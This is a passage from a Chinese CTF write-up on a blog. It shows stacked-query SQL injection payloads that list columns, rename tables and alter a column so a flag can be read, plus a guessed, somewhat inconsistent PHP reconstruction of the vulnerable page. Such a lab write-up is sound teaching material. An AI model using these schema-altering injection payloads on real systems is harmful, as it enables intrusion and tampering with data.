<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show columns from `1919810931114514`;%23</span><br><span class="line">?inject=1&apos;;show columns from `words`;%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png" alt></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png" alt></p>
</li>
<li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p>
</li>
<li><p>构造 payload 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用  <code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code> 访问一下即可获得 flag</p>
</li>
</ol>
<h2 id="个人总结-1"><a href="#个人总结-1" class="headerlink" title="个人总结"></a>个人总结</h2><ol>
<li><p>MySQL中反引号和单引号的区别与用法</p>
<ol>
<li>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</li>
<li>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即<strong>字段值</strong></li>
<li>例如：select * from `username` where `name`=”peri0d”</li>
</ol>
</li>
<li><p>PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($inject)</span></span>&#123;</span><br><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>]))&#123;</span><br><span class="line">	$id = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">	waf($id);</span><br><span class="line">	</span><br><span class="line">	$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">	$sql = <span class="string">"select * from `words` where id = '$id';"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line">		<span class="comment">/* store first result set */</span></span><br><span class="line">		$result = mysqli_multi_query($con1);</span><br><span class="line">		<span class="keyword">if</span> ($result)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">			&#123;</span><br><span class="line">			  var_dump($row);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* print divider */</span></span><br><span class="line">		<span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($con1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL 的 show、rename 和 alter 命令</p>
<ol>
<li>show 可以用于查看当前数据库，当前表，以及表中的字段</li>
<li>rename 用于修改 table 的名称</li>
<li>alter 用于修改表中字段的属性</li>
</ol>
</li>
<li><p>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了</p>
</li>
</ol>
<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
            
              <p class="site-author-name" itemprop="name">peri0d</p>
              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://buuoj.cn" title="BUUCTF" target="_blank">BUUCTF</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://adworld.xctf.org.cn/" title="攻防世界" target="_blank">攻防世界</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">peri0d</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="true"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
